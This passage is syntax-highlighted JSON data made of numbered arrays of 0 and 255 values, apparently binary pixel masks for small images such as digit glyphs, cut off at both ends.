class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"2"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>], <span class="attr">"3"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"4"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"5"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"6"</span>: [<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"7"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"8"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 